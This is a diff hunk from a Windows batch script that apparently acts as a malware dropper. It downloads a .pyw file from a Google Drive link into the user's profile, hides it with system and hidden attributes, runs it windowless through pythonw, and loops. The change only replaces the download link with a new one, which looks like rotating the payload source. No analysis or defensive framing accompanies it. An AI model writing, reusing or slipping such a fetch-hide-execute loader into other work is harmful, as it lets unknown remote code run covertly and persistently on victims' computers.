@@ -24,7 +24,7 @@ IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
 	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
 	goto rewind_1
 ) ELSE (
-	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://drive.usercontent.google.com/download?id=1A567sVc0J6MSjmZb27MkkC_Z3yyZOHxa&export=download&authuser=0&confirm=t&uuid=bd946f0e-ff99-4ffd-aae8-4277f88dadf7&at=AIrpjvNLmGE8gGEaoYYwOdJ1LR19:1736510702532"
+	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://drive.usercontent.google.com/download?id=1BWI_g0rYHTo2byBmz1ASoc6a3aH9tLSl&export=download&authuser=0&confirm=t&uuid=68837b1c-e076-4f9e-bfb0-764fb92212f6&at=AIrpjvMjI7TtfYSOANWXDDcgxurH:1736532294502"
 	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.pyw"
 	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
 	goto rewind_1
